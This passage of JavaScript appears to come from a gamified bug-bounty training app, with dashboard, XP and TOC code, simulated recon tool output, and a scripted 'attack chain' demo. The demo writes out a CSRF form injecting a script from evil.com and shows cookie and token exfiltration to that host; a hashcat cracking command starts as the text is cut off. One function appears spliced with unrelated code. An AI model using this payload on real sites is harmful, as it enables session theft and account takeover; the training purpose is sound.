    }

    // =============================================
    // HUNT DASHBOARD
    // =============================================

    const HUNT_PHASES_DEF = [
      { id: 'p0',  label: '🌍 Recon',   next: 'p4'         },
      { id: 'p4',  label: '⚙️ JS',      next: 'p16'        },
      { id: 'p16', label: '🔌 API',     next: 'p7'         },
      { id: 'p7',  label: '🛡️ XSS',    next: 'p8'         },
      { id: 'p8',  label: '💉 SQLi',    next: 'p10'        },
      { id: 'p10', label: '🔑 IDOR',    next: 'p_writeups' },
    ];

    function initHuntDashboard() {
      const session = JSON.parse(localStorage.getItem('bb_hunt_session') || 'null');
      if (session) {
        const dash = document.getElementById('hunt-dashboard');
        if (dash) dash.classList.add('visible');
        const resetBtn = document.getElementById('huntResetBtn');
        if (resetBtn) resetBtn.style.display = 'block';
        updateHuntDashboard();
      }
    }

    function updateHuntDashboard() {
      const session = JSON.parse(localStorage.getItem('bb_hunt_session') || 'null');
      if (!session) return;

      const targetEl = document.getElementById('huntTargetDisplay');
      const phasesRow = document.getElementById('huntPhasesRow');
      const phaseCount = document.getElementById('huntPhaseCount');
      const ringProgress = document.getElementById('huntRingProgress');
      const ringPct = document.getElementById('huntRingPct');
      const ringFrac = document.getElementById('huntPhaseFraction');

      if (targetEl) targetEl.textContent = session.target || 'Unknown';

      const done = (session.completedPhases || []).length;
      const total = HUNT_PHASES_DEF.length;
      const pct = Math.round((done / total) * 100);

      // SVG Ring — circumference = 2 * π * 34 ≈ 213.6
      if (ringProgress) {
        const circumference = 213.6;
        const offset = circumference - (pct / 100) * circumference;
        ringProgress.style.strokeDashoffset = offset;
      }
      if (ringPct) ringPct.textContent = pct + '%';
      if (ringFrac) ringFrac.textContent = done + '/' + total;
      if (phaseCount) phaseCount.textContent = done + ' / ' + total + ' phases complete';

      if (phasesRow) {
        phasesRow.innerHTML = HUNT_PHASES_DEF.map(function(phase) {
          const isDone = (session.completedPhases || []).includes(phase.id);
          const cls = isDone ? 'done' : 'pending';
          const icon = isDone ? '✅ ' : '';
          return '<div class="hunt-phase-chip ' + cls + '" onclick="openMethPhase(\'' + phase.id + '\')">' + icon + phase.label + '</div>';
        }).join('');
      }
    }

    function toggleHuntDash() {
      const inner = document.getElementById('huntDashInner');
      const icon = document.getElementById('huntToggleIcon');
      if (!inner) return;
      if (inner.style.display === 'none') {
        inner.style.display = 'flex';
        if (icon) icon.textContent = '▲';
      } else {
        inner.style.display = 'none';
        if (icon) icon.textContent = '▼';
      }
    }

    // =============================================
    // START HUNT MODAL — 3 Steps
    // =============================================

    let _selectedProgram = 'bug_bounty';

    function openStartHuntModal() {
      const modal = document.getElementById('start-hunt-modal');
      if (!modal) return;
      modal.style.display = 'flex';
      document.getElementById('shunt-step-1').style.display = 'block';
      document.getElementById('shunt-step-2').style.display = 'none';
      document.getElementById('shunt-step-3').style.display = 'none';
      const inp = document.getElementById('shuntTargetInput');
      const session = JSON.parse(localStorage.getItem('bb_hunt_session') || 'null');
      if (inp) {
        inp.value = session ? session.target : '';
        setTimeout(function() { inp.focus(); }, 100);
      }
    }

    function closeStartHuntModal() {
      const modal = document.getElementById('start-hunt-modal');
      if (modal) modal.style.display = 'none';
    }

    function shuntNextStep(step) {
      if (step === 1) {
        const target = (document.getElementById('shuntTargetInput') || {}).value;
        if (!target || !target.trim()) {
          const inp = document.getElementById('shuntTargetInput');
          if (inp) { inp.style.borderColor = 'var(--neon-red)'; setTimeout(function(){ inp.style.borderColor = ''; }, 1500); }
          return;
        }
        document.getElementById('shunt-step-1').style.display = 'none';
        document.getElementById('shunt-step-2').style.display = 'block';
      }
    }

    function shuntBackStep() {
      document.getElementById('shunt-step-2').style.display = 'none';
      document.getElementById('shunt-step-1').style.display = 'block';
    }

    function shuntBackStep2() {
      document.getElementById('shunt-step-3').style.display = 'none';
      document.getElementById('shunt-step-2').style.display = 'block';
    }

    function selectProgram(type, el) {
      _selectedProgram = type;
      document.querySelectorAll('.shunt-option').forEach(function(o) { o.classList.remove('selected'); });
      if (el) el.classList.add('selected');

      setTimeout(function() {
        const target = (document.getElementById('shuntTargetInput') || {}).value || '';
        const labels = { bug_bounty: '🏆 Bug Bounty', vdp: '📋 VDP', internal: '🔒 Internal' };
        const summary = document.getElementById('shuntSummary');
        if (summary) {
          summary.innerHTML = '<strong>Target:</strong> ' + target + '<br><strong>Program:</strong> ' + (labels[type] || type) + '<br><strong>Date:</strong> ' + new Date().toLocaleDateString('en-US', {day:'numeric',month:'short',year:'numeric'});
        }
        document.getElementById('shunt-step-2').style.display = 'none';
        document.getElementById('shunt-step-3').style.display = 'block';
      }, 180);
    }

    function startHunt() {
      const target = ((document.getElementById('shuntTargetInput') || {}).value || '').trim();
      if (!target) return;

      const session = {
        target: target,
        program: _selectedProgram,
        startedAt: new Date().toISOString(),
        completedPhases: []
      };
      localStorage.setItem('bb_hunt_session', JSON.stringify(session));
      closeStartHuntModal();

      const dash = document.getElementById('hunt-dashboard');
      if (dash) dash.classList.add('visible');
      const resetBtn = document.getElementById('huntResetBtn');
      if (resetBtn) resetBtn.style.display = 'block';

      updateHuntDashboard();
      openMethPhase('p0');
    }

    // ---- RESET ----
    function confirmResetHunt() {
      const ol = document.getElementById('confirm-reset-overlay');
      if (ol) ol.style.display = 'flex';
    }

    function confirmFactoryReset() {
      closeConfirmDlg('confirm-reset-overlay');
      const ol = document.getElementById('confirm-factory-overlay');
      if (ol) ol.style.display = 'flex';
    }

    function closeConfirmDlg(id) {
      const el = document.getElementById(id);
      if (el) el.style.display = 'none';
    }

    function doResetHunt() {
      localStorage.removeItem('bb_hunt_session');

      const keysToRemove = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && (k.startsWith('bb_check_') || k.startsWith('bb_phase_done_'))) keysToRemove.push(k);
      }
      keysToRemove.forEach(function(k) { localStorage.removeItem(k); });

      // Reset UI
      document.querySelectorAll('.checklist-item.checked').forEach(function(el) { el.classList.remove('checked'); });
      document.querySelectorAll('.checklist-bar-fill').forEach(function(el) { el.style.width = '0%'; });
      document.querySelectorAll('.mark-complete-btn').forEach(function(btn) {
        btn.classList.remove('completed');
        btn.disabled = false;
        if (btn.id === 'complete-btn-p0') btn.innerHTML = '✅ Mark Phase Complete — Subdomain Enumeration Done → JS Analysis';
      });

      const dash = document.getElementById('hunt-dashboard');
      if (dash) dash.classList.remove('visible');
      const resetBtn = document.getElementById('huntResetBtn');
      if (resetBtn) resetBtn.style.display = 'none';
      const targetEl = document.getElementById('huntTargetDisplay');
      if (targetEl) targetEl.textContent = 'No active session';

      closeConfirmDlg('confirm-reset-overlay');
    }

    function doFactoryReset() {
      localStorage.clear();
      location.reload();
    }

    // =============================================
    // DOMContentLoaded INIT
    // =============================================
    document.addEventListener('DOMContentLoaded', function() {
      // Existing inits
      restoreVisited();
      renderBookmarksPanel();
      initTheme();
      if (typeof generateTOC === 'function') generateTOC();
      if (typeof renderTacticsMetadata === 'function') renderTacticsMetadata();
      if (typeof renderBreadcrumbs === 'function') renderBreadcrumbs();
      markVisited('p0');

      // BB OS inits
      initHuntDashboard();
      loadChecklistState('p0', 9);
      loadChecklistState('p0-stop', 4);

      // Restore completed phase buttons
      ALL_PHASES.forEach(function(phase) {
        if (localStorage.getItem('bb_phase_done_' + phase.id) === '1') {
          const btn = document.getElementById('complete-btn-' + phase.id);
          if (btn) { btn.classList.add('completed'); btn.innerHTML = '✅ Phase Completed!'; btn.disabled = true; }
        }
      });

      // Close Start Hunt Modal on overlay click
      const modal = document.getElementById('start-hunt-modal');
      if (modal) {
        modal.addEventListener('click', function(e) {
          if (e.target === modal) closeStartHuntModal();
        });
      }
    });

  
    // =============================================
    // REDESIGN V2 — showToolInfo (Tool Inspector)
    // =============================================
    // Creates a floating tooltip-panel showing tool details
    // Called from tool cards and ▶ Simulate buttons on Phase 0

    var _toolInfoPanel = null;

    function showToolInfo(toolName, description) {
      // Remove existing panel
      if (_toolInfoPanel) { _toolInfoPanel.remove(); _toolInfoPanel = null; }

      var simOutputs = {
        subfinder: 'subfinder -d target.com -all -silent\n[info] Starting Subfinder v2.6.2...\n[info] Querying 24 passive sources...\napi.target.com\ndev.target.com        ← HOT 🎯\nstaging.target.com    ← HOT 🎯\nadmin.target.com      ← HOT 🎯\nassets.target.com\n[+] Total: 5 subdomains found.',
        httpx:     'httpx -l subs.txt -status-code -title -tech-detect\nhttps://api.target.com      [200] [API Portal] [Node.js, Nginx]\nhttps://dev.target.com      [200] [DevEnv] [PHP/8.1, Nginx]  ← TEST\nhttps://admin.target.com    [403] [Forbidden] [Apache]        ← BYPASS?\nhttps://old.target.com      [404] Not Found                   ← CHECK CNAME\n[+] 4 alive hosts.',
        nuclei:    'nuclei -l alive.txt -t takeovers/ -t cves/\n[cve-2021-41773] [critical] https://target.com/cgi-bin/..\n[git-core-leak]  [high]     https://target.com/.git/config\n[takeover-azure] [medium]   https://staging.target.com\n[+] 1 critical, 1 high, 1 medium found.',
        naabu:     'naabu -l alive.txt -top-ports 1000\nhttps://api.target.com:443\nhttps://api.target.com:8443\nhttps://dev.target.com:9200   ← Elasticsearch!\nhttps://dev.target.com:6379   ← Redis!\n[+] Non-standard ports found: 9200, 6379',
        amass:     'amass enum -passive -d target.com\n[info] OWASP Amass v3.23.2...\napi.target.com\ndev-portal.target.com\nauth.target.com\n[+] 3 subdomains (passive mode).',
        assetfinder: 'assetfinder --subs-only target.com\napi.target.com\nstatus.target.com\nblog.target.com\n[+] 3 subdomains via crt.sh.'
      };

      var output = simOutputs[toolName] || ('[*] ' + toolName + '\n' + description);

      var panel = document.createElement('div');
      panel.style.cssText = [
        'position:fixed', 'bottom:20px', 'right:20px', 'z-index:9999',
        'width:480px', 'max-width:94vw',
        'background:#04040a', 'border:1px solid rgba(0,229,255,0.3)',
        'border-radius:10px', 'box-shadow:0 0 30px rgba(0,229,255,0.15)',
        'font-family:Fira Code,monospace', 'font-size:0.85rem',
        'animation:fadeIn 0.2s ease', 'overflow:hidden'
      ].join(';');

      panel.innerHTML = [
        '<div style="background:rgba(0,229,255,0.06);border-bottom:1px solid rgba(0,229,255,0.15);',
        'padding:10px 14px;display:flex;justify-content:space-between;align-items:center;">',
        '<span style="color:#00e5ff;font-weight:700;">🛠 ' + toolName + ' — Simulator</span>',
        '<button onclick="this.closest(\'div[style]\').remove()" ',
        'style="background:none;border:none;color:rgba(148,163,184,0.6);cursor:pointer;font-size:1rem;">✕</button>',
        '</div>',
        '<div style="padding:8px 14px 4px;color:rgba(148,163,184,0.7);font-size:0.78rem;border-bottom:1px solid rgba(255,255,255,0.04);">',
        description,
        '</div>',
        '<div style="padding:14px;color:#00ff66;white-space:pre-wrap;line-height:1.7;max-height:220px;overflow-y:auto;">',
        output,
        '</div>',
        '<div style="padding:8px 14px;border-top:1px solid rgba(255,255,255,0.04);display:flex;gap:8px;">',
        '<button onclick="triggerTerminalSim(\'' + toolName + ' -d target.com\')" ',
        'style="background:rgba(0,229,255,0.07);border:1px solid rgba(0,229,255,0.25);color:#00e5ff;',
        'padding:6px 12px;border-radius:4px;cursor:pointer;font-family:Fira Code,monospace;font-size:0.78rem;">',
        '▶ Run in Terminal</button>',
        '<button onclick="this.closest(\'div[style]\').remove()" ',
        'style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);color:#94a3b8;',
        'padding:6px 12px;border-radius:4px;cursor:pointer;font-size:0.78rem;">Close</button>',
        '</div>'
      ].join('');

      document.body.appendChild(panel);
      _toolInfoPanel = panel;
      setTimeout(function() { if (panel.parentNode) panel.remove(); }, 12000);
    }

    // =============================================
    // REDESIGN V2 — New Interactive Sections
    // =============================================

    // --- Stats Counter Animation ---
    function animateCounters() {
      document.querySelectorAll('.hero-stat-value[data-target]').forEach(function(el) {
        var target = parseInt(el.getAttribute('data-target'));
        if (!target || target === 0) return;
        var prefix = el.textContent.startsWith('$') ? '$' : '';
        var suffix = '+';
        var duration = 1500;
        var start = 0;
        var startTime = null;
        function step(ts) {
          if (!startTime) startTime = ts;
          var p = Math.min((ts - startTime) / duration, 1);
          var eased = 1 - Math.pow(1 - p, 3);
          var current = Math.floor(eased * target);
          el.textContent = prefix + current.toLocaleString() + suffix;
          if (p < 1) requestAnimationFrame(step);
        }
        requestAnimationFrame(step);
      });
    }

    // --- Checklist System ---
    function initRdChecklist() {
      var items = document.querySelectorAll('#rdCheckItems .rd-check-item');
      items.forEach(function(item) {
        var idx = item.getAttribute('data-idx');
        if (localStorage.getItem('rd_check_' + idx) === '1') {
          item.classList.add('checked');
          item.querySelector('.rd-check-box').textContent = '✓';
        }
      });
      updateRdCheckProgress();
    }
    function toggleRdCheck(el) {
      var idx = el.getAttribute('data-idx');
      el.classList.toggle('checked');
      var box = el.querySelector('.rd-check-box');
      if (el.classList.contains('checked')) {
        localStorage.setItem('rd_check_' + idx, '1');
        box.textContent = '✓';
        if (typeof addGamiXP === 'function') {
          addGamiXP(10); // Add 10 XP per checklist item
        }
      } else {
        localStorage.removeItem('rd_check_' + idx);
        box.textContent = '';
      }
      updateRdCheckProgress();
    }
    function updateRdCheckProgress() {
      var total = document.querySelectorAll('#rdCheckItems .rd-check-item').length;
      var checked = document.querySelectorAll('#rdCheckItems .rd-check-item.checked').length;
      var pct = Math.round((checked / total) * 100);
      var countEl = document.getElementById('rdCheckCount');
      var fillEl = document.getElementById('rdCheckFill');
      var celebEl = document.getElementById('rdCelebration');
      if (countEl) countEl.textContent = checked + ' / ' + total;
      if (fillEl) fillEl.style.width = pct + '%';
      if (celebEl) {
        if (checked === total && total > 0) celebEl.classList.add('show');
        else celebEl.classList.remove('show');
      }
    }

    // --- Edge Case Accordion ---
    function toggleEdge(el) {
      el.classList.toggle('open');
    }

    // --- Quick Reference Toggle ---
    function toggleQuickRef() {
      var qr = document.getElementById('rdQuickRef');
      var arrow = document.getElementById('rdQrArrow');
      qr.classList.toggle('open');
      arrow.textContent = qr.classList.contains('open') ? '▼' : '▲';
    }
    function copyQR(btn, text) {
      navigator.clipboard.writeText(text).then(function() {
        btn.textContent = '✓';
        btn.classList.add('copied');
        setTimeout(function() { btn.textContent = '📋'; btn.classList.remove('copied'); }, 1500);
      });
    }

    // --- Show/Hide redesign sections based on active phase ---
    var RD_SECTIONS = ['rd-tools-grid','rd-case-study','rd-checklist','rd-mistakes','rd-edge-cases','rd-next-cta'];
    var originalOpenMethPhase = typeof openMethPhase === 'function' ? openMethPhase : null;

    function showRdSections(phaseId) {
      // Show hero + pipeline always
      var hero = document.getElementById('rd-hero-section');
      if (hero) hero.style.display = 'block';

      // Show bottom sections only on p0 (main page)
      RD_SECTIONS.forEach(function(id) {
        var el = document.getElementById(id);
        if (el) el.style.display = (phaseId === 'p0') ? 'block' : 'none';
      });
    }

    // Patch openMethPhase to also toggle redesign sections
    (function() {
      var _origOpen = window.openMethPhase;
      if (_origOpen) {
        window.openMethPhase = function(id) {
          _origOpen(id);
          showRdSections(id);
        };
      }
    })();

    function clickPipelineNode(phaseId) {
      if (typeof openMethPhase === 'function') {
        openMethPhase(phaseId);
        var viewer = document.querySelector('.meth-viewer');
        if (viewer) viewer.scrollTop = 0;
      }
    }

    // Init redesign features on DOMContentLoaded
    document.addEventListener('DOMContentLoaded', function() {
      // Animate stat counters
      setTimeout(animateCounters, 400);
      // Init checklist
      initRdChecklist();
      // Show sections for default phase
      showRdSections('p0');
      // Open quick ref by default
      var qr = document.getElementById('rdQuickRef');
      if (qr) qr.classList.add('open');
      // Generate TOC for default phase
      var defaultContent = document.getElementById('meth-content-p0');
      if (defaultContent) {
        generatePhaseTOC('p0', defaultContent);
        generateBreadcrumb('p0');
      }
    });

    // ============================================================
    // PHASE TOC GENERATOR — Auto-builds table of contents
    // ============================================================
    var _tocScrollHandler = null;

    function getCategoryForPhase(phaseId) {
      var catMap = {
        'cat-recon': ['p0','p2','p1','p_matrix'],
        'cat-discover': ['p6','p4','p16','p_graphql','p5','p3'],
        'cat-vuln': ['p7','p8','p9','p_ssti','p_xxe','p10','p11','p12','p14','p13','p15'],
        'cat-automation': ['p17','p_payloads','p18','p_writeups','p19'],
        'cat-scenarios': ['p_scen_rce','p_scen_idor','p_scen_takeover']
      };
      var catNames = {
        'cat-recon': 'Core Recon',
        'cat-discover': 'Web Discovery',
        'cat-vuln': 'Vulnerabilities',
        'cat-automation': 'Pipelines & Labs',
        'cat-scenarios': 'Hacker Scenarios'
      };
      for (var cat in catMap) {
        if (catMap[cat].indexOf(phaseId) !== -1) return catNames[cat] || cat;
      }
      return 'Methodology';
    }

    function getPhaseTitle(phaseId) {
      var contentEl = document.getElementById('meth-content-' + phaseId);
      if (!contentEl) return phaseId;
      var h1 = contentEl.querySelector('.phase-module-title') || contentEl.querySelector('.hero-title') || contentEl.querySelector('h1') || contentEl.querySelector('h2');
      if (h1) return h1.textContent.trim().replace(/^#+\s*/, '');
      return phaseId;
    }

    function generatePhaseTOC(phaseId, contentEl) {
      if (!contentEl) return;

      // Remove any existing TOC
      var oldToc = contentEl.querySelector('.phase-toc');
      if (oldToc) oldToc.remove();

      // Find all sections: os-section-label, card-header h3, h2
      var sections = [];
      var elements = contentEl.querySelectorAll('.os-section-label, .card-header h3, .phase-module-header, .info-duo, .if-nothing-box, .expected-output, .lab-box');
      var seen = {};
      var stepCount = 0;

      elements.forEach(function(el) {
        var text = '';
        if (el.classList.contains('os-section-label')) {
          text = el.textContent.trim();
        } else if (el.classList.contains('phase-module-header')) {
          text = 'Overview';
        } else if (el.classList.contains('info-duo')) {
          text = 'What & Goal';
        } else if (el.classList.contains('if-nothing-box')) {
          var title = el.querySelector('.if-nothing-title');
          text = title ? title.textContent.trim() : 'If Nothing Found';
        } else if (el.classList.contains('expected-output')) {
          return; // skip these
        } else if (el.classList.contains('lab-box')) {
          var labHeader = el.querySelector('.lab-header h3, .lab-header');
          text = labHeader ? labHeader.textContent.trim() : 'Lab';
        } else {
          text = el.textContent.trim();
        }

        if (!text || text.length > 80) return;
        if (seen[text]) return;
        seen[text] = true;
        stepCount++;

        // Add anchor ID
        var anchorId = 'phase-toc-' + phaseId + '-' + stepCount;
        el.id = anchorId;
        el.classList.add('section-anchor');

        sections.push({ id: anchorId, text: text, step: stepCount });
      });

      if (sections.length < 2) return; // Don't show TOC for tiny phases

      // Count total steps (cmd-ui-box elements)
      var totalSteps = contentEl.querySelectorAll('.cmd-ui-box').length;

      // Build TOC HTML
      var phaseTitle = getPhaseTitle(phaseId);
      var category = getCategoryForPhase(phaseId);
      var tocHtml = '<div class="phase-toc">';
      tocHtml += '<div class="phase-toc-title">\u{1F4D1} IN THIS SECTION</div>';
      tocHtml += '<button class="phase-toc-toggle" onclick="this.parentElement.classList.toggle(\'collapsed\'); this.textContent = this.parentElement.classList.contains(\'collapsed\') ? \'+ show\' : \'\u2212 hide\';">\u2212 hide</button>';
      tocHtml += '<ul class="phase-toc-list">';

      sections.forEach(function(s) {
        tocHtml += '<li class="phase-toc-item" data-target="' + s.id + '" onclick="scrollToPhaseSection(\'' + s.id + '\')">';
        tocHtml += '<span class="toc-step-num">' + s.step + '</span>';
        tocHtml += '<span>' + s.text + '</span>';
        tocHtml += '</li>';
      });

      tocHtml += '</ul></div>';

      // Insert TOC after the phase-module-header
      const el = document.getElementById('meth-ef-' + phaseId);
      if (el) {
        const textNodes = Array.from(el.childNodes).filter(n => n.nodeType === 3);
        if (textNodes.length > 0) return textNodes[textNodes.length - 1].textContent.trim();
        return el.textContent.replace(/[\u{1F300}-\u{1F6FF}]/gu, '').trim(); // Fallback: remove emojis
      }
      return 'Phase';
    }

    function generateBreadcrumb(phaseId) {
      var viewer = document.querySelector('.meth-viewer');
      if (!viewer) return;

      var oldBcs = viewer.querySelectorAll('.phase-breadcrumb');
      oldBcs.forEach(function(bc) { bc.remove(); });

      var category = getCategoryForPhase(phaseId);
      var title = getPhaseTitle(phaseId);
      var contentEl = document.getElementById('meth-content-' + phaseId);
      var totalSteps = contentEl ? contentEl.querySelectorAll('.cmd-ui-box').length : 0;

      var bcHtml = '<div class="phase-breadcrumb">';
      bcHtml += '<span class="bc-category">' + category + '</span>';
      bcHtml += '<span class="bc-separator">\u203A</span>';
      bcHtml += '<span class="bc-phase">' + title + '</span>';
      if (totalSteps > 0) {
        bcHtml += '<span class="bc-step-count">' + totalSteps + ' steps</span>';
      }
      bcHtml += '</div>';

      var phaseContent = document.getElementById('meth-content-' + phaseId);
      if (phaseContent) {
        phaseContent.insertBefore(createElementFromHTML(bcHtml), phaseContent.firstChild);
      }
    }

    function scrollToPhaseSection(anchorId) {
      var el = document.getElementById(anchorId);
      if (!el) return;
      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    function setupScrollSpy(contentEl, sections) {
      // Remove old handler
      if (_tocScrollHandler) {
        document.querySelector('.meth-viewer') &&
          document.querySelector('.meth-viewer').removeEventListener('scroll', _tocScrollHandler);
      }

      var viewer = document.querySelector('.meth-viewer');
      if (!viewer) return;

      _tocScrollHandler = function() {
        var scrollTop = viewer.scrollTop;
        var activeId = null;

        for (var i = sections.length - 1; i >= 0; i--) {
          var el = document.getElementById(sections[i].id);
          if (el) {
            var rect = el.getBoundingClientRect();
            if (rect.top <= 150) {
              activeId = sections[i].id;
              break;
            }
          }
        }

        var tocItems = contentEl.querySelectorAll('.phase-toc-item');
        tocItems.forEach(function(item) {
          if (item.getAttribute('data-target') === activeId) {
            item.classList.add('active');
          } else {
            item.classList.remove('active');
          }
        });
      };

      viewer.addEventListener('scroll', _tocScrollHandler);
    }

    function createElementFromHTML(htmlString) {
      var div = document.createElement('div');
      div.innerHTML = htmlString.trim();
      return div.firstElementChild || div.firstChild;
    }

// ==========================================
// 🎮 HUNTER OS GAMIFICATION ENGINE
// ==========================================

const GAMI_RANKS = [
  { name: 'Script Kiddie 👶', min: 0 },
  { name: 'Junior Hunter 🔍', min: 100 },
  { name: 'Bug Hunter 🕵️', min: 250 },
  { name: 'Senior Hunter 🎯', min: 500 },
  { name: 'Elite Hacker 🥷', min: 1000 },
  { name: '0day God 🐉', min: 2500 }
];
const GAMI_BADGES = {
  p0: { id: 'b_recon', icon: '🌐', title: 'Recon Master', required: 9 },
  p2: { id: 'b_tech', icon: '🖥️', title: 'Tech Profiler', required: 2 },
  p1: { id: 'b_port', icon: '📡', title: 'Port Scanner', required: 2 }
};

let currentXP = parseInt(localStorage.getItem('hunteros_xp') || '0');

function addGamiXP(amount, phaseId) {
  currentXP += amount;
  localStorage.setItem('hunteros_xp', currentXP);
  updateGamiUI();
  showXpFloatAnimation(amount);
  
  let oldRank = localStorage.getItem('hunteros_rank') || GAMI_RANKS[0].name;
  let newRank = getGamiRank().name;
  if (oldRank !== newRank) {
    localStorage.setItem('hunteros_rank', newRank);
    shootConfetti();
  }

  if (phaseId) checkBadges(phaseId);
}

function getGamiRank() {
  let rank = GAMI_RANKS[0];
  for (let i = 0; i < GAMI_RANKS.length; i++) {
    if (currentXP >= GAMI_RANKS[i].min) rank = GAMI_RANKS[i];
  }
  return rank;
}

function updateGamiUI() {
  const xpEl = document.getElementById('gamiXp');
  const rankEl = document.getElementById('gamiRank');
  const fillEl = document.getElementById('gamiBarFill');
  const nextEl = document.getElementById('gamiNextLevel');
  
  if (!xpEl || !rankEl || !fillEl) return;
  
  xpEl.textContent = currentXP + ' XP';
  
  let currentRank = getGamiRank();
  let nextRank = GAMI_RANKS[GAMI_RANKS.indexOf(currentRank) + 1] || null;
  
  rankEl.textContent = currentRank.name;
  localStorage.setItem('hunteros_rank', currentRank.name);
  
  if (nextRank) {
    const xpNeeded = nextRank.min - currentRank.min;
    const xpProgress = currentXP - currentRank.min;
    const pct = Math.min(100, Math.round((xpProgress / xpNeeded) * 100));
    fillEl.style.width = pct + '%';
    nextEl.textContent = `Next Rank: ${nextRank.name.replace(/ .*/, '')} (${nextRank.min} XP)`;
  } else {
    fillEl.style.width = '100%';
    nextEl.textContent = 'MAX LEVEL REACHED 🏆';
  }
}

function showXpFloatAnimation(amount) {
  const gamiTracker = document.querySelector('.gamification-tracker');
  if (!gamiTracker) return;
  
  const floater = document.createElement('div');
  floater.textContent = '+' + amount + ' XP';
  floater.style.position = 'absolute';
  floater.style.right = '20px';
  floater.style.top = '10px';
  floater.style.color = 'var(--neon-green)';
  floater.style.fontWeight = 'bold';
  floater.style.fontFamily = "'Fira Code', monospace";
  floater.style.textShadow = '0 0 10px rgba(0, 255, 102, 0.8)';
  floater.style.transition = 'all 1s ease-out';
  floater.style.opacity = '1';
  floater.style.transform = 'translateY(0) scale(1)';
  floater.style.zIndex = '100';
  
  gamiTracker.style.position = 'relative';
  gamiTracker.appendChild(floater);
  
  requestAnimationFrame(() => {
    floater.style.transform = 'translateY(-30px) scale(1.2)';
    floater.style.opacity = '0';
  });
  
  setTimeout(() => {
    if (floater.parentNode) floater.parentNode.removeChild(floater);
  }, 1000);
}

function updateStreak() {
  const streakEl = document.getElementById('gamiStreak');
  if (!streakEl) return;
  
  let lastLogin = localStorage.getItem('hunteros_last_login');
  let currentStreak = parseInt(localStorage.getItem('hunteros_streak') || '0');
  
  const today = new Date().toDateString();
  
  if (lastLogin !== today) {
    if (lastLogin) {
      let lastDate = new Date(lastLogin);
      let diffTime = Math.abs(new Date() - lastDate);
      let diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
      
      if (diffDays === 1) {
        currentStreak++;
      } else if (diffDays > 1) {
        currentStreak = 1;
      }
    } else {
      currentStreak = 1;
    }
    localStorage.setItem('hunteros_last_login', today);
    localStorage.setItem('hunteros_streak', currentStreak);
  }
  
  streakEl.textContent = `🔥 ${currentStreak} Days`;
  if (currentStreak > 3) streakEl.style.boxShadow = '0 0 10px rgba(255,152,0,0.5)';
}

function checkBadges(phaseId) {
  const badgeDef = GAMI_BADGES[phaseId];
  if (!badgeDef) return;
  
  let checkedCount = 0;
  for (let i = 0; i < badgeDef.required; i++) {
    if (localStorage.getItem('bb_check_' + phaseId + '_' + i) === '1') {
      checkedCount++;
    }
  }
  
  let unlockedStr = localStorage.getItem('hunteros_badges') || '';
  let unlockedList = unlockedStr ? unlockedStr.split(',') : [];
  
  if (checkedCount === badgeDef.required && !unlockedList.includes(badgeDef.id)) {
    unlockedList.push(badgeDef.id);
    localStorage.setItem('hunteros_badges', unlockedList.join(','));
    renderBadges();
    shootConfetti();
  }
}

function renderBadges() {
  const wrap = document.getElementById('gamiBadgesWrap');
  if (!wrap) return;
  
  let unlockedStr = localStorage.getItem('hunteros_badges') || '';
  let unlockedList = unlockedStr ? unlockedStr.split(',') : [];
  
  wrap.innerHTML = '';
  
  for (const key in GAMI_BADGES) {
    const badge = GAMI_BADGES[key];
    if (unlockedList.includes(badge.id)) {
      const el = document.createElement('div');
      el.className = 'gami-badge unlocked';
      el.textContent = badge.icon + ' ' + badge.title;
      wrap.appendChild(el);
    }
  }
}

function shootConfetti() {
  const colors = ['#00e5ff', '#b026ff', '#00ff66', '#ff5983'];
  for (let i = 0; i < 50; i++) {
    const conf = document.createElement('div');
    conf.style.position = 'fixed';
    conf.style.left = Math.random() * 100 + 'vw';
    conf.style.top = '-10px';
    conf.style.width = Math.random() * 8 + 4 + 'px';
    conf.style.height = Math.random() * 8 + 4 + 'px';
    conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    conf.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
    conf.style.zIndex = '9999';
    conf.style.pointerEvents = 'none';
    
    document.body.appendChild(conf);
    
    const duration = Math.random() * 2 + 2;
    const keyframes = [
      { transform: 'translateY(0) rotate(0deg)' },
      { transform: `translateY(100vh) rotate(${Math.random() * 720}deg)` }
    ];
    
    const animation = conf.animate(keyframes, {
      duration: duration * 1000,
      easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
    });
    
    animation.onfinish = () => conf.remove();
  }
}

document.addEventListener('DOMContentLoaded', function() {
  updateGamiUI();
  updateStreak();
  renderBadges();
});




// Live Simulations Engine
const simulationScripts = {

  chaining: [
    { text: "root@kali:~# cat exploit.html", type: "cmd", delay: 800 },
    { text: "<!-- Attack Chain: CSRF to trigger Self-XSS -->", type: "info", delay: 200 },
    { text: "<form id='f' action='https://api.target.com/user/address' method='POST'>", type: "output", delay: 100 },
    { text: "  <input type='hidden' name='city' value='<script src="https://evil.com/hook.js"></script>'>", type: "output", delay: 100 },
    { text: "</form>", type: "output", delay: 100 },
    { text: "<script>document.getElementById('f').submit();</script>", type: "output", delay: 100 },
    { text: "root@kali:~# python3 -m http.server 80", type: "cmd", delay: 1200 },
    { text: "Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...", type: "success", delay: 600 },
    { text: "Waiting for victim to click the link...", type: "warning", delay: 2000 },
    { text: "[*] Incoming connection from Target Admin IP (198.51.100.45)", type: "info", delay: 1500 },
    { text: "198.51.100.45 - - [17/Jun/2026 14:05:12] \"GET /exploit.html HTTP/1.1\" 200 -", type: "output", delay: 400 },
    { text: "[+] CSRF Executed! Admin address updated to payload.", type: "success", delay: 1000 },
    { text: "[*] XSS Payload Triggered in Admin Session!", type: "warning", delay: 800 },
    { text: "198.51.100.45 - - [17/Jun/2026 14:05:15] \"GET /hook.js HTTP/1.1\" 200 -", type: "output", delay: 400 },
    { text: "[+] Connection received on evil.com/exfiltrate", type: "success", delay: 1200 },
    { text: "Extracted Cookie: session_id=admin_778899aabbccddeeff; secure; HttpOnly=false", type: "success", delay: 500 },
    { text: "Extracted CSRF Token: csrf_998877", type: "success", delay: 300 },
    { text: "root@kali:~# Account Takeover Complete! 🏆", type: "cmd", delay: 1000 }
  ],


  hashcat: [
    { text: "root@kali:~# hashcat -m 0 -a 0 -O -w 3 hashes.txt rockyou.txt -r rules/best64.rule", type: "cmd", delay: 800 },
